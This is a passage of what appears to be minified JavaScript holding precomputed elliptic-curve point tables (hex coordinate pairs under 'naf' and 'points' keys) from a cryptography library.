45c4d47ea4dd2f5c281002d86890603a842160"],["3322d401243c4e2582a2147c104d6ecbf774d163db0f5e5313b7e0e742d0e6bd","56e70797e9664ef5bfb019bc4ddaf9b72805f63ea2873af624f3a2e96c28b2a0"],["85672c7d2de0b7da2bd1770d89665868741b3f9af7643397721d74d28134ab83","7c481b9b5b43b2eb6374049bfa62c2e5e77f17fcc5298f44c8e3094f790313a6"],["948bf809b1988a46b06c9f1919413b10f9226c60f668832ffd959af60c82a0a","53a562856dcb6646dc6b74c5d1c3418c6d4dff08c97cd2bed4cb7f88d8c8e589"],["6260ce7f461801c34f067ce0f02873a8f1b0e44dfc69752accecd819f38fd8e8","bc2da82b6fa5b571a7f09049776a1ef7ecd292238051c198c1a84e95b2b4ae17"],["e5037de0afc1d8d43d8348414bbf4103043ec8f575bfdc432953cc8d2037fa2d","4571534baa94d3b5f9f98d09fb990bddbd5f5b03ec481f10e0e5dc841d755bda"],["e06372b0f4a207adf5ea905e8f1771b4e7e8dbd1c6a6c5b725866a0ae4fce725","7a908974bce18cfe12a27bb2ad5a488cd7484a7787104870b27034f94eee31dd"],["213c7a715cd5d45358d0bbf9dc0ce02204b10bdde2a3f58540ad6908d0559754","4b6dad0b5ae462507013ad06245ba190bb4850f5f36a7eeddff2c27534b458f2"],["4e7c272a7af4b34e8dbb9352a5419a87e2838c70adc62cddf0cc3a3b08fbd53c","17749c766c9d0b18e16fd09f6def681b530b9614bff7dd33e0b3941817dcaae6"],["fea74e3dbe778b1b10f238ad61686aa5c76e3db2be43057632427e2840fb27b6","6e0568db9b0b13297cf674deccb6af93126b596b973f7b77701d3db7f23cb96f"],["76e64113f677cf0e10a2570d599968d31544e179b760432952c02a4417bdde39","c90ddf8dee4e95cf577066d70681f0d35e2a33d2b56d2032b4b1752d1901ac01"],["c738c56b03b2abe1e8281baa743f8f9a8f7cc643df26cbee3ab150242bcbb891","893fb578951ad2537f718f2eacbfbbbb82314eef7880cfe917e735d9699a84c3"],["d895626548b65b81e264c7637c972877d1d72e5f3a925014372e9f6588f6c14b","febfaa38f2bc7eae728ec60818c340eb03428d632bb067e179363ed75d7d991f"],["b8da94032a957518eb0f6433571e8761ceffc73693e84edd49150a564f676e03","2804dfa44805a1e4d7c99cc9762808b092cc584d95ff3b511488e4e74efdf6e7"],["e80fea14441fb33a7d8adab9475d7fab2019effb5156a792f1a11778e3c0df5d","eed1de7f638e00771e89768ca3ca94472d155e80af322ea9fcb4291b6ac9ec78"],["a301697bdfcd704313ba48e51d567543f2a182031efd6915ddc07bbcc4e16070","7370f91cfb67e4f5081809fa25d40f9b1735dbf7c0a11a130c0d1a041e177ea1"],["90ad85b389d6b936463f9d0512678de208cc330b11307fffab7ac63e3fb04ed4","e507a3620a38261affdcbd9427222b839aefabe1582894d991d4d48cb6ef150"],["8f68b9d2f63b5f339239c1ad981f162ee88c5678723ea3351b7b444c9ec4c0da","662a9f2dba063986de1d90c2b6be215dbbea2cfe95510bfdf23cbf79501fff82"],["e4f3fb0176af85d65ff99ff9198c36091f48e86503681e3e6686fd5053231e11","1e63633ad0ef4f1c1661a6d0ea02b7286cc7e74ec951d1c9822c38576feb73bc"],["8c00fa9b18ebf331eb961537a45a4266c7034f2f0d4e1d0716fb6eae20eae29e","efa47267fea521a1a9dc343a3736c974c2fadafa81e36c54e7d2a4c66702414b"],["e7a26ce69dd4829f3e10cec0a9e98ed3143d084f308b92c0997fddfc60cb3e41","2a758e300fa7984b471b006a1aafbb18d0a6b2c0420e83e20e8a9421cf2cfd51"],["b6459e0ee3662ec8d23540c223bcbdc571cbcb967d79424f3cf29eb3de6b80ef","67c876d06f3e06de1dadf16e5661db3c4b3ae6d48e35b2ff30bf0b61a71ba45"],["d68a80c8280bb840793234aa118f06231d6f1fc67e73c5a5deda0f5b496943e8","db8ba9fff4b586d00c4b1f9177b0e28b5b0e7b8f7845295a294c84266b133120"],["324aed7df65c804252dc0270907a30b09612aeb973449cea4095980fc28d3d5d","648a365774b61f2ff130c0c35aec1f4f19213b0c7e332843967224af96ab7c84"],["4df9c14919cde61f6d51dfdbe5fee5dceec4143ba8d1ca888e8bd373fd054c96","35ec51092d8728050974c23a1d85d4b5d506cdc288490192ebac06cad10d5d"],["9c3919a84a474870faed8a9c1cc66021523489054d7f0308cbfc99c8ac1f98cd","ddb84f0f4a4ddd57584f044bf260e641905326f76c64c8e6be7e5e03d4fc599d"],["6057170b1dd12fdf8de05f281d8e06bb91e1493a8b91d4cc5a21382120a959e5","9a1af0b26a6a4807add9a2daf71df262465152bc3ee24c65e899be932385a2a8"],["a576df8e23a08411421439a4518da31880cef0fba7d4df12b1a6973eecb94266","40a6bf20e76640b2c92b97afe58cd82c432e10a7f514d9f3ee8be11ae1b28ec8"],["7778a78c28dec3e30a05fe9629de8c38bb30d1f5cf9a3a208f763889be58ad71","34626d9ab5a5b22ff7098e12f2ff580087b38411ff24ac563b513fc1fd9f43ac"],["928955ee637a84463729fd30e7afd2ed5f96274e5ad7e5cb09eda9c06d903ac","c25621003d3f42a827b78a13093a95eeac3d26efa8a8d83fc5180e935bcd091f"],["85d0fef3ec6db109399064f3a0e3b2855645b4a907ad354527aae75163d82751","1f03648413a38c0be29d496e582cf5663e8751e96877331582c237a24eb1f962"],["ff2b0dce97eece97c1c9b6041798b85dfdfb6d8882da20308f5404824526087e","493d13fef524ba188af4c4dc54d07936c7b7ed6fb90e2ceb2c951e01f0c29907"],["827fbbe4b1e880ea9ed2b2e6301b212b57f1ee148cd6dd28780e5e2cf856e241","c60f9c923c727b0b71bef2c67d1d12687ff7a63186903166d605b68baec293ec"],["eaa649f21f51bdbae7be4ae34ce6e5217a58fdce7f47f9aa7f3b58fa2120e2b3","be3279ed5bbbb03ac69a80f89879aa5a01a6b965f13f7e59d47a5305ba5ad93d"],["e4a42d43c5cf169d9391df6decf42ee541b6d8f0c9a137401e23632dda34d24f","4d9f92e716d1c73526fc99ccfb8ad34ce886eedfa8d8e4f13a7f7131deba9414"],["1ec80fef360cbdd954160fadab352b6b92b53576a88fea4947173b9d4300bf19","aeefe93756b5340d2f3a4958a7abbf5e0146e77f6295a07b671cdc1cc107cefd"],["146a778c04670c2f91b00af4680dfa8bce3490717d58ba889ddb5928366642be","b318e0ec3354028add669827f9d4b2870aaa971d2f7e5ed1d0b297483d83efd0"],["fa50c0f61d22e5f07e3acebb1aa07b128d0012209a28b9776d76a8793180eef9","6b84c6922397eba9b72cd2872281a68a5e683293a57a213b38cd8d7d3f4f2811"],["da1d61d0ca721a11b1a5bf6b7d88e8421a288ab5d5bba5220e53d32b5f067ec2","8157f55a7c99306c79c0766161c91e2966a73899d279b48a655fba0f1ad836f1"],["a8e282ff0c9706907215ff98e8fd416615311de0446f1e062a73b0610d064e13","7f97355b8db81c09abfb7f3c5b2515888b679a3e50dd6bd6cef7c73111f4cc0c"],["174a53b9c9a285872d39e56e6913cab15d59b1fa512508c022f382de8319497c","ccc9dc37abfc9c1657b4155f2c47f9e6646b3a1d8cb9854383da13ac079afa73"],["959396981943785c3d3e57edf5018cdbe039e730e4918b3d884fdff09475b7ba","2e7e552888c331dd8ba0386a4b9cd6849c653f64c8709385e9b8abf87524f2fd"],["d2a63a50ae401e56d645a1153b109a8fcca0a43d561fba2dbb51340c9d82b151","e82d86fb6443fcb7565aee58b2948220a70f750af484ca52d4142174dcf89405"],["64587e2335471eb890ee7896d7cfdc866bacbdbd3839317b3436f9b45617e073","d99fcdd5bf6902e2ae96dd6447c299a185b90a39133aeab358299e5e9faf6589"],["8481bde0e4e4d885b3a546d3e549de042f0aa6cea250e7fd358d6c86dd45e458","38ee7b8cba5404dd84a25bf39cecb2ca900a79c42b262e556d64b1b59779057e"],["13464a57a78102aa62b6979ae817f4637ffcfed3c4b1ce30bcd6303f6caf666b","69be159004614580ef7e433453ccb0ca48f300a81d0942e13f495a907f6ecc27"],["bc4a9df5b713fe2e9aef430bcc1dc97a0cd9ccede2f28588cada3a0d2d83f366","d3a81ca6e785c06383937adf4b798caa6e8a9fbfa547b16d758d666581f33c1"],["8c28a97bf8298bc0d23d8c749452a32e694b65e30a9472a3954ab30fe5324caa","40a30463a3305193378fedf31f7cc0eb7ae784f0451cb9459e71dc73cbef9482"],["8ea9666139527a8c1dd94ce4f071fd23c8b350c5a4bb33748c4ba111faccae0","620efabbc8ee2782e24e7c0cfb95c5d735b783be9cf0f8e955af34a30e62b945"],["dd3625faef5ba06074669716bbd3788d89bdde815959968092f76cc4eb9a9787","7a188fa3520e30d461da2501045731ca941461982883395937f68d00c644a573"],["f710d79d9eb962297e4f6232b40e8f7feb2bc63814614d692c12de752408221e","ea98e67232d3b3295d3b535532115ccac8612c721851617526ae47a9c77bfc82"]]},naf:{wnd:7,points:[["f9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f9","388f7b0f632de8140fe337e62a37f3566500a99934c2231b6cb9fd7584b8e672"],["2f8bde4d1a07209355b4a7250a5c5128e88b84bddc619ab7cba8d569b240efe4","d8ac222636e5e3d6d4dba9dda6c9c426f788271bab0d6840dca87d3aa6ac62d6"],["5cbdf0646e5db4eaa398f365f2ea7a0e3d419b7e0330e39ce92bddedcac4f9bc","6aebca40ba255960a3178d6d861a54dba813d0b813fde7b5a5082628087264da"],["acd484e2f0c7f65309ad178a9f559abde09796974c57e714c35f110dfc27ccbe","cc338921b0a7d9fd64380971763b61e9add888a4375f8e0f05cc262ac64f9c37"],["774ae7f858a9411e5ef4246b70c65aac5649980be5c17891bbec17895da008cb","d984a032eb6b5e190243dd56d7b7b365372db1e2dff9d6a8301d74c9c953c61b"],["f28773c2d975288bc7d1d205c3748651b075fbc6610e58cddeeddf8f19405aa8","ab0902e8d880a89758212eb65cdaf473a1a06da521fa91f29b5cb52db03ed81"],["d7924d4f7d43ea965a465ae3095ff41131e5946f3c85f79e44adbcf8e27e080e","581e2872a86c72a683842ec228cc6defea40af2bd896d3a5c504dc9ff6a26b58"],["defdea4cdb677750a420fee807eacf21eb9898ae79b9768766e4faa04a2d4a34","4211ab0694635168e997b0ead2a93daeced1f4a04a95c0f6cfb199f69e56eb77"],["2b4ea0a797a443d293ef5cff444f4979f06acfebd7e86d277475656138385b6c","85e89bc037945d93b343083b5a1c86131a01f60c50269763b570c854e5c09b7a"],["352bbf4a4cdd12564f93fa332ce333301d9ad40271f8107181340aef25be59d5","321eb4075348f534d59c18259dda3e1f4a1b3b2e71b1039c67bd3d8bcf81998c"],["2fa2104d6b38d11b0230010559879124e42ab8dfeff5ff29dc9cdadd4ecacc3f","2de1068295dd865b64569335bd5dd80181d70ecfc882648423ba76b532b7d67"],["9248279b09b4d68dab21a9b066edda83263c3d84e09572e269ca0cd7f5453714","73016f7bf234aade5d1aa71bdea2b1ff3fc0de2a887912ffe54a32ce97cb3402"],["daed4f2be3a8bf278e70132fb0beb7522f570e144bf615c07e996d443dee8729","a69dce4a7d6c98e8d4a1aca87ef8d7003f83c230f3afa726ab40e52290be1c55"],["c44d12c7065d812e8acf28d7cbb19f9011ecd9e9fdf281b0e6a3b5e87d22e7db","2119a460ce326cdc76c45926c982fdac0e106e861edf61c5a039063f0e0e6482"],["6a245bf6dc698504c89a20cfded60853152b695336c28063b61c65cbd269e6b4","e022cf42c2bd4a708b3f5126f16a24ad8b33ba48d0423b6efd5e6348100d8a82"],["1697ffa6fd9de627c077e3d2fe541084ce13300b0bec1146f95ae57f0d0bd6a5","b9c398f186806f5d27561506e4557433a2cf15009e498ae7adee9d63d01b2396"],["605bdb019981718b986d0f07e834cb0d9deb8360ffb7f61df982345ef27a7479","2972d2de4f8d20681a78d93ec96fe23c26bfae84fb14db43b01e1e9056b8c49"],["62d14dab4150bf497402fdc45a215e10dcb01c354959b10cfe31c7e9d87ff33d","80fc06bd8cc5b01098088a1950eed0db01aa132967ab472235f5642483b25eaf"],["80c60ad0040f27dade5b4b06c408e56b2c50e9f56b9b8b425e555c2f86308b6f","1c38303f1cc5c30f26e66bad7fe72f70a65eed4cbe7024eb1aa01f56430bd57a"],["7a9375ad6167ad54aa74c6348cc54d344cc5dc9487d847049d5eabb0fa03c8fb","d0e3fa9eca8726909559e0d79269046bdc59ea10c70ce2b02d499ec224dc7f7"],["d528ecd9b696b54c907a9ed045447a79bb408ec39b68df504bb51f459bc3ffc9","eecf41253136e5f99966f21881fd656ebc4345405c520dbc063465b521409933"],["49370a4b5f43412ea25f514e8ecdad05266115e4a7ecb1387231808f8b45963","758f3f41afd6ed428b3081b0512fd62a54c3f3afbb5b6764b653052a12949c9a"],["77f230936ee88cbbd73df930d64702ef881d811e0e1498e2f1c13eb1fc345d74","958ef42a7886b6400a08266e9ba1b37896c95330d97077cbbe8eb3c7671c60d6"],["f2dac991cc4ce4b9ea44887e5c7c0bce58c80074ab9d4dbaeb28531b7739f530","e0dedc9b3b2f8dad4da1f32dec2531df9eb5fbeb0598e4fd1a117dba703a3c37"],["463b3d9f662621fb1b4be8fbbe2520125a216cdfc9dae3debcba4850c690d45b","5ed430d78c296c3543114306dd8622d7c622e27c970a1de31cb377b01af7307e"],["f16f804244e46e2a09232d4aff3b59976b98fac14328a2d1a32496b49998f247","cedabd9b82203f7e13d206fcdf4e33d92a6c53c26e5cce26d6579962c4e31df6"],["caf754272dc84563b0352b7a14311af55d245315ace27c65369e15f7151d41d1","cb474660ef35f5f2a41b643fa5e460575f4fa9b7962232a5c32f908318a04476"],["2600ca4b282cb986f85d0f1709979d8b44a09c07cb86d7c124497bc86f082120","4119b88753c15bd6a693b03fcddbb45d5ac6be74ab5f0ef44b0be9475a7e4b40"],["7635ca72d7e8432c338ec53cd12220bc01c48685e24f7dc8c602a7746998e435","91b649609489d613d1d5e590f78e6d74ecfc061d57048bad9e76f302c5b9c61"],["754e3239f325570cdbbf4a87deee8a66b7f2b33479d468fbc1a50743bf56cc18","673fb86e5bda30fb3cd0ed304ea49a023ee33d0197a695d0c5d98093c536683"],["e3e6bd1071a1e96aff57859c82d570f0330800661d1c952f9fe2694691d9b9e8","59c9e0bba394e76f40c0aa58379a3cb6a5a2283993e90c4167002af4920e37f5"],["186b483d056a033826ae73d88f732985c4ccb1f32ba35f4b4cc47fdcf04aa6eb","3b952d32c67cf77e2e17446e204180ab21fb8090895138b4a4a797f86e80888b"],["df9d70a6b9876ce544c98561f4be4f725442e6d2b737d9c91a8321724ce0963f","55eb2dafd84d6ccd5f862b785dc39d4ab157222720ef9da217b8c45cf2ba2417"],["5edd5cc23c51e87a497ca815d5dce0f8ab52554f849ed8995de64c5f34ce7143","efae9c8dbc14130661e8cec030c89ad0c13c66c0d17a2905cdc706ab7399a868"],["290798c2b6476830da12fe02287e9e777aa3fba1c355b17a722d362f84614fba","e38da76dcd440621988d00bcf79af25d5b29c094db2a23146d003afd41943e7a"],["af3c423a95d9f5b3054754efa150ac39cd29552fe360257362dfdecef4053b45","f98a3fd831eb2b749a93b0e6f35cfb40c8cd5aa667a15581bc2feded498fd9c6"],["766dbb24d134e745cccaa28c99bf274906bb66b26dcf98df8d2fed50d884249a","744b1152eacbe5e38dcc887980da38b897584a65fa06cedd2c924f97cbac5996"],["59dbf46f8c94759ba21277c33784f41645f7b44f6c596a58ce92e666191abe3e","c534ad44175fbc300f4ea6ce648309a042ce739a7919798cd85e216c4a307f6e"],["f13ada95103c4537305e691e74e9a4a8dd647e711a95e73cb62dc6018cfd87b8","e13817b44ee14de663bf4bc808341f326949e21a6a75c2570778419bdaf5733d"],["7754b4fa0e8aced06d4167a2c59cca4cda1869c06ebadfb6488550015a88522c","30e93e864e669d82224b967c3020b8fa8d1e4e350b6cbcc537a48b57841163a2"],["948dcadf5990e048aa3874d46abef9d701858f95de8041d2a6828c99e2262519","e491a42537f6e597d5d28a3224b1bc25df9154efbd2ef1d2cbba2cae5347d57e"],["7962414450c76c1689c7b48f8202ec37fb224cf5ac0bfa1570328a8a3d7c77ab","100b610ec4ffb4760d5c1fc133ef6f6b12507a051f04ac5760afa5b29db83437"],["3514087834964b54b15b160644d915485a16977225b8847bb0dd085137ec47ca","ef0afbb2056205448e1652c48e8127fc6039e77c15c2378b7e7d15a0de293311"],["d3cc30ad6b483e4bc79ce2c9dd8bc54993e947eb8df787b442943d3f7b527eaf","8b378a22d827278d89c5e9be8f9508ae3c2ad46290358630afb34db04eede0a4"],["1624d84780732860ce1c78fcbfefe08b2b29823db913f6493975ba0ff4847610","68651cf9b6da903e0914448c6cd9d4ca896878f5282be4c8cc06e2a404078575"],["733ce80da955a8a26902c95633e62a985192474b5af207da6df7b4fd5fc61cd4","f5435a2bd2badf7d485a4d8b8db9fcce3e1ef8e0201e4578c54673bc1dc5ea1d"],["15d9441254945064cf1a1c33bbd3b49f8966c5092171e699ef258dfab81c045c","d56eb30b69463e7234f5137b73b84177434800bacebfc685fc37bbe9efe4070d"],["a1d0fcf2ec9de675b612136e5ce70d271c21417c9d2b8aaaac138599d0717940","edd77f50bcb5a3cab2e90737309667f2641462a54070f3d519212d39c197a629"],["e22fbe15c0af8ccc5780c0735f84dbe9a790badee8245c06c7ca37331cb36980","a855babad5cd60c88b430a69f53a1a7a38289154964799be43d06d77d31da06"],["311091dd9860e8e20ee13473c1155f5f69635e394704eaa74009452246cfa9b3","66db656f87d1f04fffd1f04788c06830871ec5a64feee685bd80f0b1286d8374"],["34c1fd04d301be89b31c0442d3e6ac24883928b45a9340781867d4232ec2dbdf","9414685e97b1b5954bd46f730174136d57f1ceeb487443dc5321857ba73abee"],["f219ea5d6b54701c1c14de5b557eb42a8d13f3abbcd08affcc2a5e6b049b8d63","4cb95957e83d40b0f73af4544cccf6b1f4b08d3c07b27fb8d8c2962a400766d1"],["d7b8740f74a8fbaab1f683db8f45de26543a5490bca627087236912469a0b448","fa77968128d9c92ee1010f337ad4717eff15db5ed3c049b3411e0315eaa4593b"],["32d31c222f8f6f0ef86f7c98d3a3335ead5bcd32abdd94289fe4d3091aa824bf","5f3032f5892156e39ccd3d7915b9e1da2e6dac9e6f26e961118d14b8462e1661"],["7461f371914ab32671045a155d9831ea8793d77cd59592c4340f86cbc18347b5","8ec0ba238b96bec0cbdddcae0aa442542eee1ff50c986ea6b39847b3cc092ff6"],["ee079adb1df1860074356a25aa38206a6d716b2c3e67453d287698bad7b2b2d6","8dc2412aafe3be5c4c5f37e0ecc5f9f6a446989af04c4e25ebaac479ec1c8c1e"],["16ec93e447ec83f0467b18302ee620f7e65de331874c9dc72bfd8616ba9da6b5","5e4631150e62fb40d0e8c2a7ca5804a39d58186a50e497139626778e25b0674d"],["eaa5f980c245f6f038978290afa70b6bd8855897f98b6aa485b96065d537bd99","f65f5d3e292c2e0819a528391c994624d784869d7e6ea67fb18041024edc07dc"],["78c9407544ac132692ee1910a02439958ae04877151342ea96c4b6b35a49f51","f3e0319169eb9b85d5404795539a5e68fa1fbd583c064d2462b675f194a3ddb4"],["494f4be219a1a77016dcd838431aea0001cdc8ae7a6fc688726578d9702857a5","42242a969283a5f339ba7f075e36ba2af925ce30d767ed6e55f4b031880d562c"],["a598a8030da6d86c6bc7f2f5144ea549d28211ea58faa70ebf4c1e665c1fe9b5","204b5d6f84822c307e4b4a7140737aec23fc63b65b35f86a10026dbd2d864e6b"],["c41916365abb2b5d09192f5f2dbeafec208f020f12570a184dbadc3e58595997","4f14351d0087efa49d245b328984989d5caf9450f34bfc0ed16e96b58fa9913"],["841d6063a586fa475a724604da03bc5b92a2e0d2e0a36acfe4c73a5514742881","73867f59c0659e81904f9a1c7543698e62562d6744c169ce7a36de01a8d6154"],["5e95bb399a6971d376026947f89bde2f282b33810928be4ded112ac4d70e20d5","39f23f366809085beebfc71181313775a99c9aed7d8ba38b161384c746012865"],["36e4641a53948fd476c39f8a99fd974e5ec07564b5315d8bf99471bca0ef2f66","d2424b1b1abe4eb8164227b085c9aa9456ea13493fd563e06fd51cf5694c78fc"],["336581ea7bfbbb290c191a2f507a41cf5643842170e914faeab27c2c579f726","ead12168595fe1be99252129b6e56b3391f7ab1410cd1e0ef3dcdcabd2fda224"],["8ab89816dadfd6b6a1f2634fcf00ec8403781025ed6890c4849742706bd43ede","6fdcef09f2f6d0a044e654aef624136f503d459c3e89845858a47a9129cdd24e"],["1e33f1a746c9c5778133344d9299fcaa20b0938e8acff2544bb40284b8c5fb94","60660257dd11b3aa9c8ed618d24edff2306d320f1d03010e33a7d2057f3b3b6"],["85b7c1dcb3cec1b7ee7f30ded79dd20a0ed1f4cc18cbcfcfa410361fd8f08f31","3d98a9cdd026dd43f39048f25a8847f4fcafad1895d7a633c6fed3c35e999511"],["29df9fbd8d9e46509275f4b125d6d45d7fbe9a3b878a7af872a2800661ac5f51","b4c4fe99c775a606e2d8862179139ffda61dc861c019e55cd2876eb2a27d84b"],["a0b1cae06b0a847a3fea6e671aaf8adfdfe58ca2f768105c8082b2e449fce252","ae434102edde0958ec4b19d917a6a28e6b72da1834aff0e650f049503a296cf2"],["4e8ceafb9b3e9a136dc7ff67e840295b499dfb3b2133e4ba113f2e4c0e121e5","cf2174118c8b6d7a4b48f6d534ce5c79422c086a63460502b827ce62a326683c"],["d24a44e047e19b6f5afb81c7ca2f69080a5076689a010919f42725c2b789a33b","6fb8d5591b466f8fc63db50f1c0f1c69013f996887b8244d2cdec417afea8fa3"],["ea01606a7a6c9cdd249fdfcfacb99584001edd28abbab77b5104e98e8e3b35d4","322af4908c7312b0cfbfe369f7a7b3cdb7d4494bc2823700cfd652188a3ea98d"],["af8addbf2b661c8a6c6328655eb96651252007d8c5ea31be4ad196de8ce2131f","6749e67c029b85f52a034eafd096836b2520818680e26ac8f3dfbcdb71749700"],["e3ae1974566ca06cc516d47e0fb165a674a3dabcfca15e722f0e3450f45889","2aeabe7e4531510116217f07bf4d07300de97e4874f81f533420a72eeb0bd6a4"],["591ee355313d99721cf6993ffed1e3e301993ff3ed258802075ea8ced397e246","b0ea558a113c30bea60fc4775460c7901ff0b053d25ca2bdeee98f1a4be5d196"],["11396d55fda54c49f19aa97318d8da61fa8584e47b084945077cf03255b52984","998c74a8cd45ac01289d5833a7beb4744ff536b01b257be4c5767bea93ea57a4"],["3c5d2a1ba39c5a1790000738c9e0c40b8dcdfd5468754b6405540157e017aa7a","b2284279995a34e2f9d4de7396fc18b80f9b8b9fdd270f6661f79ca4c81bd257"],["cc8704b8a60a0defa3a99a7299f2e9c3fbc395afb04ac078425ef8a1793cc030","bdd46039feed17881d1e0862db347f8cf395b74fc4bcdc4e940b74e3ac1f1b13"],["c533e4f7ea8555aacd9777ac5cad29b97dd4defccc53ee7ea204119b2889b197","6f0a256bc5efdf429a2fb6242f1a43a2d9b925bb4a4b3a26bb8e0f45eb596096"],["c14f8f2ccb27d6f109f6d08d03cc96a69ba8c34eec07bbcf566d48e33da6593","c359d6923bb398f7fd4473e16fe1c28475b740dd098075e6c0e8649113dc3a38"],["a6cbc3046bc6a450bac24789fa17115a4c9739ed75f8f21ce441f72e0b90e6ef","21ae7f4680e889bb130619e2c0f95a360ceb573c70603139862afd617fa9b9f"],["347d6d9a02c48927ebfb86c1359b1caf130a3c0267d11ce6344b39f99d43cc38","60ea7f61a353524d1c987f6ecec92f086d565ab687870cb12689ff1e31c74448"],["da6545d2181db8d983f7dcb375ef5866d47c67b1bf31c8cf855ef7437b72656a","49b96715ab6878a79e78f07ce5680c5d6673051b4935bd897fea824b77dc208a"],["c40747cc9d012cb1a13b8148309c6de7ec25d6945d657146b9d5994b8feb1111","5ca560753be2a12fc6de6caf2cb489565db936156b9514e1bb5e83037e0fa2d4"],["4e42c8ec82c99798ccf3a610be870e78338c7f713348bd34c8203ef4037f3502","7571d74ee5e0fb92a7a8b33a07783341a5492144cc54bcc40a94473693606437"],["3775ab7089bc6af823aba2e1af70b236d251cadb0c86743287522a1b3b0dedea","be52d107bcfa09d8bcb9736a828cfa7fac8db17bf7a76a2c42ad961409018cf7"],["cee31cbf7e34ec379d94fb814d3d775ad954595d1314ba8846959e3e82f74e26","8fd64a14c06b589c26b947ae2bcf6bfa0149ef0be14ed4d80f448a01c43b1c6d"],["b4f9eaea09b6917619f6ea6a4eb5464efddb58fd45b1ebefcdc1a01d08b47986","39e5c9925b5a54b07433a4f18c61726f8bb131c012ca542eb24a8ac07200682a"],["d4263dfc3d2df923a0179a48966d30ce84e2515afc3dccc1b77907792ebcc60e","62dfaf07a0f78feb30e30d6295853ce189e127760ad6cf7fae164e122a208d54"],["48457524820fa65a4f8d35eb6930857c0032acc0a4a2de422233eeda897612c4","25a748ab367979d98733c38a1fa1c2e7dc6cc07db2d60a9ae7a76aaa49bd0f77"],["dfeeef1881101f2cb11644f3a2afdfc2045e19919152923f367a1767c11cceda","ecfb7056cf1de042f9420bab396793c0c390bde74b4bbdff16a83ae09a9a7517"],["6d7ef6b17543f8373c573f44e1f389835d89bcbc6062ced36c82df83b8fae859","cd450ec335438986dfefa10c57fea9bcc521a0959b2d80bbf74b190dca712d10"],["e75605d59102a5a2684500d3b991f2e3f3c88b93225547035af25af66e04541f","f5c54754a8f71ee540b9b48728473e314f729ac5308b06938360990e2bfad125"],["eb98660f4c4dfaa06a2be453d5020bc99a0c2e60abe388457dd43fefb1ed620c","6cb9a8876d9cb8520609af3add26cd20a0a7cd8a9411131ce85f44100099223e"],["13e87b027d8514d35939f2e6892b19922154596941888336dc3563e3b8dba942","fef5a3c68059a6dec5d624114bf1e91aac2b9da568d6abeb2570d55646b8adf1"],["ee163026e9fd6fe017c38f06a5be6fc125424b371ce2708e7bf4491691e5764a","1acb250f255dd61c43d94ccc670d0f58f49ae3fa15b96623e5430da0ad6c62b2"],["b268f5ef9ad51e4d78de3a750c2dc89b1e626d43505867999932e5db33af3d80","5f310d4b3c99b9ebb19f77d41c1dee018cf0d34fd4191614003e945a1216e423"],["ff07f3118a9df035e9fad85eb6c7bfe42b02f01ca99ceea3bf7ffdba93c4750d","438136d603e858a3a5c440c38eccbaddc1d2942114e2eddd4740d098ced1f0d8"],["8d8b9855c7c052a34146fd20ffb658bea4b9f69e0d825ebec16e8c3ce2b526a1","cdb559eedc2d79f926baf44fb84ea4d44bcf50fee51d7ceb30e2e7f463036758"],["52db0b5384dfbf05bfa9d472d7ae26dfe4b851ceca91b1eba54263180da32b63","c3b997d050ee5d423ebaf66a6db9f57b3180c902875679de924b69d84a7b375"],["e62f9490d3d51da6395efd24e80919cc7d0f29c3f3fa48c6fff543becbd43352","6d89ad7ba4876b0b22c2ca280c682862f342c8591f1daf5170e07bfd9ccafa7d"],["7f30ea2476b399b4957509c88f77d0191afa2ff5cb7b14fd6d8e7d65aaab1193","ca5ef7d4b231c94c3b15389a5f6311e9daff7bb67b103e9880ef4bff637acaec"],["5098ff1e1d9f14fb46a210fada6c903fef0fb7b4a1dd1d9ac60a0361800b7a00","9731141d81fc8f8084d37c6e7542006b3ee1b40d60dfe5362a5b132fd17ddc0"],["32b78c7de9ee512a72895be6b9cbefa6e2f3c4ccce445c96b9f2c81e2778ad58","ee1849f513df71e32efc3896ee28260c73bb80547ae2275ba497237794c8753c"],["e2cb74fddc8e9fbcd076eef2a7c72b0ce37d50f08269dfc074b581550547a4f7","d3aa2ed71c9dd2247a62df062736eb0baddea9e36122d2be8641abcb005cc4a4"],["8438447566d4d7bedadc299496ab357426009a35f235cb141be0d99cd10ae3a8","c4e1020916980a4da5d01ac5e6ad330734ef0d7906631c4f2390426b2edd791f"],["4162d488b89402039b584c6fc6c308870587d9c46f660b878ab65c82c711d67e","67163e903236289f776f22c25fb8a3afc1732f2b84b4e95dbda47ae5a0852649"],["3fad3fa84caf0f34f0f89bfd2dcf54fc175d767aec3e50684f3ba4a4bf5f683d","cd1bc7cb6cc407bb2f0ca647c718a730cf71872e7d0d2a53fa20efcdfe61826"],["674f2600a3007a00568c1a7ce05d0816c1fb84bf1370798f1c69532faeb1a86b","299d21f9413f33b3edf43b257004580b70db57da0b182259e09eecc69e0d38a5"],["d32f4da54ade74abb81b815ad1fb3b263d82d6c692714bcff87d29bd5ee9f08f","f9429e738b8e53b968e99016c059707782e14f4535359d582fc416910b3eea87"],["30e4e670435385556e593657135845d36fbb6931f72b08cb1ed954f1e3ce3ff6","462f9bce619898638499350113bbc9b10a878d35da70740dc695a559eb88db7b"],["be2062003c51cc3004682904330e4dee7f3dcd10b01e580bf1971b04d4cad297","62188bc49d61e5428573d48a74e1c655b1c61090905682a0d5558ed72dccb9bc"],["93144423ace3451ed29e0fb9ac2af211cb6e84a601df5993c419859fff5df04a","7c10dfb164c3425f5c71a3f9d7992038f1065224f72bb9d1d902a6d13037b47c"],["b015f8044f5fcbdcf21ca26d6c34fb8197829205c7b7d2a7cb66418c157b112c","ab8c1e086d04e813744a655b2df8d5f83b3cdc6faa3088c1d3aea1454e3a1d5f"],["d5e9e1da649d97d89e4868117a465a3a4f8a18de57a140d36b3f2af341a21b52","4cb04437f391ed73111a13cc1d4dd0db1693465c2240480d8955e8592f27447a"],["d3ae41047dd7ca065dbf8ed77b992439983005cd72e16d6f996a5316d36966bb","bd1aeb21ad22ebb22a10f0303417c6d964f8cdd7df0aca614b10dc14d125ac46"],["463e2763d885f958fc66cdd22800f0a487197d0a82e377b49f80af87c897b065","bfefacdb0e5d0fd7df3a311a94de062b26b80c61fbc97508b79992671ef7ca7f"],["7985fdfd127c0567c6f53ec1bb63ec3158e597c40bfe747c83cddfc910641917","603c12daf3d9862ef2b25fe1de289aed24ed291e0ec6708703a5bd567f32ed03"],["74a1ad6b5f76e39db2dd249410eac7f99e74c59cb83d2d0ed5ff1543da7703e9","cc6157ef18c9c63cd6193d83631bbea0093e0968942e8c33d5737fd790e0db08"],["30682a50703375f602d416664ba19b7fc9bab42c72747463a71d0896b22f6da3","553e04f6b018b4fa6c8f39e7f311d3176290d0e0f19ca73f17714d9977a22ff8"],["9e2158